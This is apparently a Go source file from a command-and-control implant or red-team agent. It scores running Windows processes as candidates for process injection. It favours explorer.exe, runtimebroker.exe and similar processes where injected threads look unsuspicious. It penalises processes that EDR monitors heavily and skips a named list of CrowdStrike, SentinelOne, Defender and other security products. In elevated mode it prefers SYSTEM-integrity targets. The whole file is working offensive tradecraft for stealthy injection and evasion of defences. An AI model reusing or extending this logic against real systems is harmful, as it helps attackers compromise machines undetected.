package commands

import (
	"encoding/json"
	"fmt"
	"strings"
)

// InjectionTarget represents a scored candidate for process injection
type InjectionTarget struct {
	PID            int32    `json:"pid"`
	Name           string   `json:"name"`
	Arch           string   `json:"arch"`
	User           string   `json:"user"`
	IntegrityLevel int      `json:"integrity_level"`
	Score          int      `json:"score"`
	Reasons        []string `json:"reasons"`
}

// TargetMode specifies the injection target selection strategy
type TargetMode string

const (
	TargetAuto         TargetMode = "auto"          // best general target
	TargetAutoElevated TargetMode = "auto-elevated" // prefer SYSTEM/high integrity
	TargetAutoUser     TargetMode = "auto-user"     // prefer same-user targets
)

// commonInjectableProcesses are processes that normally exist on Windows and
// where injected threads don't look suspicious. Weighted by how common they
// are and how often EDR specifically monitors them.
var commonInjectableProcesses = map[string]int{
	"explorer.exe":          30, // one per user session, commonly injected, moderate monitoring
	"runtimebroker.exe":     25, // multiple instances, low monitoring
	"sihost.exe":            20, // shell infrastructure host
	"taskhostw.exe":         20, // task scheduler host
	"ctfmon.exe":            15, // text framework, low profile
	"dllhost.exe":           15, // COM surrogate, multiple instances
	"conhost.exe":           10, // console host, common
	"backgroundtaskhost.exe": 10,
	"searchhost.exe":        10,
}

// criticalProcesses that should not be injected into (crash = BSOD or system instability)
var criticalProcesses = map[string]bool{
	"system":             true,
	"smss.exe":           true,
	"csrss.exe":          true,
	"wininit.exe":        true,
	"services.exe":       true,
	"lsass.exe":          true,
	"lsaiso.exe":         true,
	"registry":           true,
	"memory compression": true,
}

// heavilyMonitoredProcesses that EDR watches closely for injection
var heavilyMonitoredProcesses = map[string]int{
	"lsass.exe":    -50, // #1 monitored process globally
	"svchost.exe":  -15, // Defender RADAR monitors injection into svchost
	"csrss.exe":    -40, // critical + heavily monitored
	"winlogon.exe": -20, // credential path process
	"spoolsv.exe":  -10, // common attack target
}

// edrProcesses are known EDR/AV process names that should never be injected into
var edrProcesses = map[string]bool{
	// CrowdStrike
	"csfalconservice.exe": true, "csagent.exe": true, "csfalconcontainer.exe": true,
	// SentinelOne
	"sentinelagent.exe": true, "sentinelstaticengine.exe": true, "sentinelservicehost.exe": true,
	// Microsoft Defender
	"msmpeng.exe": true, "mssense.exe": true, "securityhealthservice.exe": true, "smartscreen.exe": true,
	// Carbon Black
	"cb.exe": true, "cbdefense.exe": true, "cbcomms.exe": true,
	// Sophos
	"sophossps.exe": true, "savservice.exe": true,
	// ESET
	"ekrn.exe": true, "egui.exe": true,
	// Kaspersky
	"avp.exe": true, "kavtray.exe": true,
	// Cortex XDR
	"cyserver.exe": true, "traps.exe": true, "cortex xdr.exe": true,
	// Elastic
	"elastic-endpoint.exe": true, "elastic-agent.exe": true,
	// Cybereason
	"activeconsole.exe": true, "cyrsvc.exe": true,
	// Malwarebytes
	"mbamservice.exe": true, "mbamtray.exe": true,
}

// scoreProcess evaluates a single process for injection suitability
func scoreProcess(p ProcessInfo, myPID int32, myArch, myUser string, myIntegrity int, mode TargetMode) *InjectionTarget {
	nameLower := strings.ToLower(p.Name)

	// Absolute exclusions
	if p.PID <= 4 {
		return nil // System/Idle
	}
	if p.PID == myPID {
		return nil // Can't inject into self
	}
	if criticalProcesses[nameLower] {
		return nil // Critical system process
	}
	if edrProcesses[nameLower] {
		return nil // EDR process
	}

	score := 50 // Base score
	var reasons []string

	// Architecture matching (+30 / -100)
	if p.Arch == myArch || p.Arch == "amd64" || p.Arch == "x64" {
		score += 30
		reasons = append(reasons, "arch match")
	} else {
		return nil // Cross-arch injection is unreliable
	}

	// Common injectable process bonus
	if bonus, ok := commonInjectableProcesses[nameLower]; ok {
		score += bonus
		reasons = append(reasons, fmt.Sprintf("common process (+%d)", bonus))
	}

	// Heavily monitored process penalty
	if penalty, ok := heavilyMonitoredProcesses[nameLower]; ok {
		score += penalty
		reasons = append(reasons, fmt.Sprintf("monitored (%+d)", penalty))
	}

	// Same user bonus (+20)
	if myUser != "" && p.User != "" && strings.EqualFold(p.User, myUser) {
		score += 20
		reasons = append(reasons, "same user")
	}

	// Integrity level scoring based on mode
	switch mode {
	case TargetAutoElevated:
		if p.IntegrityLevel >= 4 {
			score += 40
			reasons = append(reasons, "SYSTEM integrity")
		} else if p.IntegrityLevel >= 3 {
			score += 25
			reasons = append(reasons, "high integrity")
		} else if p.IntegrityLevel <= 2 {
			score -= 20
			reasons = append(reasons, "low integrity")
		}
	case TargetAutoUser:
		if p.IntegrityLevel == myIntegrity {
			score += 15
			reasons = append(reasons, "matching integrity")
		}
		if p.IntegrityLevel >= 4 {
			score -= 30 // Don't want SYSTEM when seeking user-level
			reasons = append(reasons, "avoid SYSTEM")
		}
	default: // TargetAuto
		// Prefer similar integrity level
		if p.IntegrityLevel == myIntegrity {
			score += 15
			reasons = append(reasons, "matching integrity")
		}
		// Slight bonus for elevated if we're elevated
		if myIntegrity >= 3 && p.IntegrityLevel >= 3 {
			score += 10
			reasons = append(reasons, "both elevated")
		}
	}

	// Long-running process bonus (old start time = less suspicious)
	if p.StartTime > 0 && p.StartTime < 1000000000 {
		score += 5
		reasons = append(reasons, "long-running")
	}

	if score <= 0 {
		return nil
	}

	return &InjectionTarget{
		PID:            p.PID,
		Name:           p.Name,
		Arch:           p.Arch,
		User:           p.User,
		IntegrityLevel: p.IntegrityLevel,
		Score:          score,
		Reasons:        reasons,
	}
}

// FormatTargetSelection returns a JSON string with the scored target list
func FormatTargetSelection(targets []InjectionTarget) string {
	data, _ := json.MarshalIndent(targets, "", "  ")
	return string(data)
}

// BestTarget returns the highest-scored target from the list, or an error
func BestTarget(targets []InjectionTarget) (int32, error) {
	if len(targets) == 0 {
		return 0, fmt.Errorf("no suitable injection targets found")
	}
	return targets[0].PID, nil
}
